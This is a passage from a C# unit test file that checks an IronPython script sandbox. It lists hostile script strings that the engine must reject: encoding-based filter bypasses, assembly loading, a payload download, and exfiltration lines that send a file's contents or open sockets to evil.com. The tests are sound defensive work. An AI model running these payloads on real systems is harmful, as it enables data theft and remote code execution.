                    $"Failed to block exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_VariationsOfSystemAccess_AreAllBlocked()
        {
            // Test various ways someone might try to access system functionality
            var exploits = new[]
            {
                "import System",
                "from System import IO", 
                "from System.IO import File",
                "__import__('System')",
                "System.Environment.Exit(0)",
                "System.Diagnostics.Process.Start('calc')",
                "System.IO.Directory.GetFiles('C:\\\\')",
                "System.Reflection.Assembly.LoadFrom('evil.dll')",
                "System.Net.WebClient().DownloadFile('http://evil.com', 'payload.exe')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_BytecodeAndEncodingAttacks_AreBlocked()
        {
            // Test attempts to bypass filters using encoding or bytecode
            var exploits = new[]
            {
                "eval(compile('import os', '<string>', 'exec'))",
                "exec(bytes([105, 109, 112, 111, 114, 116, 32, 111, 115]))", // "import os" as bytes
                "exec('\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73')", // "import os" hex encoded
                "__import__(chr(111)+chr(115))", // "os" built from chars
                "getattr(__builtins__, ''.join([chr(101), chr(120), chr(101), chr(99)]))", // "exec"
                "eval(base64.b64decode('aW1wb3J0IG9z'))", // "import os" base64 encoded
                "__import__(''.join(['o', 's']))"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonSpecificAttacks_AreBlocked()
        {
            // Test IronPython-specific attack vectors
            var exploits = new[]
            {
                "import clr",
                "clr.AddReference('System')",
                "from System import Type",
                "Type.GetType('System.IO.File')",
                "__import__('clr').AddReference('System.Windows.Forms')",
                "import System; System.GC.Collect()",
                "clr.LoadAssemblyFromFile('malicious.dll')",
                "__import__('System').AppDomain.CurrentDomain.GetAssemblies()"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_DataExfiltrationAttacks_AreBlocked()
        {
            // Test attempts to exfiltrate data or establish persistence
            var exploits = new[]
            {
                "__import__('urllib').urlopen('http://evil.com/?data='+open('sensitive.txt').read())",
                "__import__('smtplib').SMTP('evil.com').sendmail('user@evil.com', ['target@victim.com'], 'data')",
                "__import__('socket').socket().connect(('evil.com', 1337))",
                "open('startup.py', 'w').write('malicious_code')",
                "__import__('sqlite3').connect('data.db').execute('SELECT * FROM secrets')",
                "__import__('pickle').loads(malicious_data)",
                "__import__('json').loads(user_input_with_exploit)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block exploit: {exploit}");
            }
        }

        #endregion
    }
}
